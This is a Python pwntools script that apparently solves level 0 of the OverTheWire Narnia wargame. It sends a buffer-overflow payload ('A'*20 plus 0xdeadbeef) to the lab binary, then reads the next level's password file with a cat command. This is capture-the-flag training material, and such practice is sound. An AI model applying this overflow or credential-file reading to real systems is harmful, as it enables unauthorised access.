#!/usr/bin/python

from pwn import *
import re

context(arch='i386', os='linux')

s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0')
sh = s.run('/narnia/narnia0')
sh.sendline('A'*20 + p32(0xdeadbeef))
sh.sendline('cat /etc/narnia_pass/narnia1')
while 1:
	flag = sh.recvline().strip()
	reFlag = re.match(r'\$(.*)', flag, re.M|re.I)
	if reFlag:
		break
print "[+] Flag is: " + reFlag.group(1)
s.close()